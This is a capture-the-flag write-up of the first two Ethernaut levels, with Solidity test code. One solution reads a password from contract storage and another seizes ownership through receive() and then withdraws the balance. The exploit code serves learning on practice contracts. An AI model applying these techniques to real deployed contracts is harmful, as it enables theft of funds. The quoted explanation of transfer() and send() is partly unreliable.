# Write Ups

## 00 Hello

### Solution 1

Just read the factory contract

```solidity
return address(new Instance('ethernaut0'));
```

And call the function

```solidity
function testExploit1() public {
    // password can be observed from the factory contract
    challenge.authenticate("ethernaut0");

    utils.submitLevelInstance(challengeAddress);
}
```

### Solution 2

Suppose we don't have the factory file at hand, but we can read the blockchain. We do that and call the function with the found value.

To simplify things (we can always check the lowest bit), assume we know beforehand the string is at most 31 bytes long. Since  the first slot (`0`) is giving us the value `0x65746865726e6175743000000000000000000000000000000000000000000014`, we can conclude the string is length `10` bytes (`0x14` = `20` = `2 * 20 bytes`), and the string is `0x65746865726e61757430`. Take it to CyberChef to verify is `ethernaut0`:

https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MHg2NTc0Njg2NTcyNmU2MTc1NzQzMA

Then we know we have to read the first 10 bytes from the slot `0` and convert it to a string in order to use it as a variable.

```solidity
// alternate solution: you can't read the factory.
// you can always read the blockchain though
function testExploit() public {

  // get the contents of the slot 0 from the challenge address,
  // assuming that this is a string with less than 32 bytes,
  // in that case, length the lowest-order byte stores the value length * 2.
  bytes32 slot0 = vm.load(challengeAddress, bytes32(uint256(0)));
  uint8 len = uint8(slot0[31]) / 2;

  bytes memory password = new bytes(len);

  for (uint8 i = 0; i < len; i++) {
    password[i] = slot0[i];
  }

  // test the found password in the contract
  challenge.authenticate(string(password));

  utils.submitLevelInstance(challengeAddress);
}
```

### References

* https://docs.soliditylang.org/en/v0.8.18/internals/layout_in_storage.html

> In particular: if the data is at most 31 bytes long, the elements are stored
> in the higher-order bytes (left aligned) and the lowest-order byte stores the value length * 2.
> For byte arrays that store data which is 32 or more bytes long, the main slot p stores length * 2 + 1 and the data is stored as usual in `keccak256(p)`. This means that you can distinguish a short array from a long array by checking if the lowest bit is set: short (not set) and long (set).

* https://betterprogramming.pub/all-about-solidity-data-locations-part-i-storage-e50604bfc1ad
    * Long, comprehensive article
* https://www.adrianhetman.com/unboxing-evm-storage/
    * Matter of fact article
* https://blog.openzeppelin.com/ethereum-in-depth-part-2-6339cf6bddb9/
    * See `Storage` section. Includes assembly.

## 01 Fallback

To beat this level, we need to comply with

```solidity
instance.owner() == _player && address(instance).balance == 0;
```

### Solution

Notice that the `receive()` function can make `msg.sender` the owner of the contract

```solidity
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender;
}
```

Alas, we need to add some money to `contributions`:

```solidity
function contribute() public payable {
  require(msg.value < 0.001 ether);
  contributions[msg.sender] += msg.value;
  if(contributions[msg.sender] > contributions[owner]) {
    owner = msg.sender;
  }
}
```

So, to solve this level:

* First, we call `contribute()` with one wei, then we `call()` the contract  with another wei (`msg.value > 0` control).
* After that we are the owner of the contract and can `withdraw()` the funds.
* Now, notice that in our test we are invoking the level from a contract (as opposed from an EOA), so we need to include a `receive()` function ourselves.

```solidity
// make this true
// contributions[msg.sender] > 0
challenge.contribute{value: 1 wei}();
```

```solidity
// trigger code in receive()
(bool success,) = address(challengeAddress).call{value: 1 wei}("");
```

```solidity
// See the comment in receive() below
challenge.withdraw();
```

```solidity
// we need a receive function, since we are receiving
// the funds here and this is not an EOA
receive() external payable {}
```

### References

A review on `receive()` and `fallback()` functions

```
           send Ether
               |
         msg.data is empty?
              / \
            yes  no
            /     \
receive() exists?  fallback()
         /   \
        yes   no
        /      \
    receive()   fallback()
```

Review, why is not recommended to use the `transfer()` function

> The transfer() function in Solidity is used to send ether (the cryptocurrency used on the Ethereum network) from one address to another. This function was originally introduced as a simple way to transfer ether and was widely used in smart contracts.

> However, the transfer() function has a limitation that can cause problems in some situations. The function limits the amount of gas used to send the transaction to 2300 gas. If the receiving contract requires more than 2300 gas to process the transaction, the transfer will fail and the ether will be returned to the sender.

> This can lead to unexpected behavior and security issues, as it can allow attackers to cause denial-of-service attacks by creating contracts that require more than 2300 gas to process a transfer. For this reason, the use of transfer() is no longer recommended for sending large amounts of ether or for interacting with complex contracts.

> Instead, the recommended approach is to use the send() or call() functions, which allow for more fine-grained control over the gas limit and provide more robust error handling. Additionally, newer Solidity versions have introduced the payable modifier for functions, which makes it easier to handle incoming ether payments.

Other links for further reading

* https://docs.soliditylang.org/en/v0.8.18/contracts.html#receive-ether-function
* https://docs.soliditylang.org/en/v0.8.18/contracts.html#fallback-function
* https://solidity-by-example.org/fallback/
* https://solidity-by-example.org/sending-ether/
